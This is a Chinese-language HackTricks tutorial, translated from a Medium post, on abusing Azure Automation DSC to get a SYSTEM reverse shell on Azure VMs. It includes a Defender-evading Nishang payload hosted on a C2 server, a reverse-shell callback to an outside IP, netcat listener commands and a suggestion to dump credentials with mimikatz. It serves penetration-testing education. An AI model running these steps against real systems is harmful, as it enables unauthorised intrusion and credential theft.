# Az - 状态配置 RCE

<details>

<summary><strong>从零开始学习 AWS 黑客技术直到成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

**本文摘自** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### 远程服务器 (C2) 基础设施准备 <a href="#f0fa" id="f0fa"></a>

我将在远程服务器“40.84.7.74”上托管一个精简版的 Nishang Invoke-PowerShellTcp.ps1 负载，该服务器是 Kali 盒子。负载名称将是“RevPS.ps1”。为了防止 Nishang 脚本因任何原因（也许您宁愿将文件丢到磁盘上）被 Windows Defender 删除，我在这里有一个轻量级版本，您可以使用它来绕过 Defender：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)。这将由 Kali 盒子上的一个简单 Python Simple Server 托管。

### 步骤 1 — 创建文件 <a href="#89de" id="89de"></a>

我们需要创建另一个 DSC 配置文件。模板可以在这里下载：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)。这个配置文件将使用我们之前使用的相同的文件写入功能。这次，内容包括从我们的远程服务器下载和执行负载的代码。此外，我们正在使用 _ComputerManagementDsc_ 模块中可用的计划任务功能。计划任务功能将是执行的关键角色，并稍后为我们提供 SYSTEM 权限。

我们还将下载一个脚本，用于将我们的配置发布到 VM。它位于这里：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)。

这些文件将作为模板。**您需要用您正在使用的变量名和参数填充**。这包括资源名称、文件路径以及您正在使用的外部服务器/负载名称。请参考代码中的注释。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### 步骤 2 — 压缩配置文件 <a href="#c2c2" id="c2c2"></a>

创建了两个文件后，我们将 **‘reverse\_shell\_config.ps1’** 文件压缩，以便可以发送到存储账户
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
### 步骤3 — 设置存储上下文 & 上传 <a href="#bed9" id="bed9"></a>

我们将再次设置我们的存储账户的上下文，这一步我已经完成了。我已经有了一个名为‘**azure-pentest**’的容器，所以我将在这里发布我的内容：
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
### 第4步 — 准备Kali盒子 <a href="#20fb" id="20fb"></a>

在我们的Kali盒子中，我们可以简单地使用_wget_来获取我们的PowerShell有效载荷。原始的反向Shell脚本位于此处：[https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)。
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
```markdown
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

我们需要通过添加我们的参数来编辑反向 shell 脚本，以便 Windows VM 知道一旦执行后要连接到哪里。在我的情况下，我添加了以下内容：
```
```
RevPShell -Reverse 40.84.7.73 443
```
### 步骤 5 — 发布配置文件 <a href="#9ad6" id="9ad6"></a>

现在我们将运行我们的配置文件。我将我的设置为发布到桌面以便更好地可视化，但它几乎可以发布到任何地方。几分钟后，我们将看到反向 shell 脚本已经发布！

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 步骤 6 — 托管有效载荷并设置监听器 <a href="#c55f" id="c55f"></a>

一旦我们发布配置，我们可以同时启动一个 Python SimpleHTTPServer 在 80 端口上托管有效载荷，以及一个 netcat 监听器以捕获连接：
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
我们看到计划任务已经运行，我们的有效载荷被检索并以**SYSTEM**级别权限在内存中执行了！

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### 总结 <a href="#1ec2" id="1ec2"></a>

这为我们打开了许多可能性。由于我们有一个以**SYSTEM**身份运行的shell，我们可以使用mimikatz转储凭据（取决于云资源的EDR成熟度，这可能有风险）。如果你转储了凭据，很有可能这些凭据可以在不同资源中重复使用。最后，一个重要的收获是，你现在有能力将这个配置应用到多个VM上，而不仅仅是一个VM。

就此，我们的Azure自动化DSC冒险就结束了！我希望你玩得开心，学到了很多，并继续用你自己的创造力扩展知识。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为英雄，就用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
